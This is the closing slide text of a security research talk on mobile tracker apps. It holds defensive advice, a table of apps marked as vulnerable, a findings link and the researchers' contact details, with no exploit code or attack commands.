§ DON`T use plaintext communication in mobile! § Use prepared statements (in correct way J) to avoid SQL injection § App security is important but also consider back-end security
149

Summary
§ DON`T use plaintext communication in mobile! § Use prepared statements (in correct way J) to avoid SQL injection § App security is important but also consider back-end security § DON'T store any user secrets in the app (client side)
150

Summary
§ DON`T use plaintext communication in mobile! § Use prepared statements (in correct way J) to avoid SQL injection § App security is important but also consider back-end security § DON'T store any user secrets in the app (client side) § Google provides API for payment and license verification § Authentication and authorization for back-end data (e.g. firebase*)
*https://firebase.google.com/docs/auth/
151

My Family GPS Tracker KidControll GPS Tracker Family Locator (GPS) Free Cell Tracker Rastreador de Novia 1 Rastreador de Novia 2 Phone Tracker Free Phone Tracker Pro Rastrear Celular Por el Numero Localizador de Celular GPS Rastreador de Celular Avanzado Handy Orten per Handynr Localiser un Portable avec son Numero Phone Tracker By Number Track My Family Couple Vow Real Time GPS Tracker Couple Tracker App Ilocatemobile

Client-Side Vulnerability
X X X X X X X X X X X X X X
X X
http://sit4.me/tracker-apps
152

Access All Data X
X X X X X X X X X X X X X X
X

153

Findings: http://sit4.me/tracker-apps

Siegfried Rasthofer Email: siegfried.rasthofer@sit.fraunhofer.de Web: www.rasthofer.info
Stephan Huber Email: stephan.huber@sit.fraunhofer.de
Twitter: @teamsik Web: www.team-sik.org
154

Thanks to... Alex, Daniel, Julien, Julius,
Michael, Philipp, Steven, Kevin, Sebald

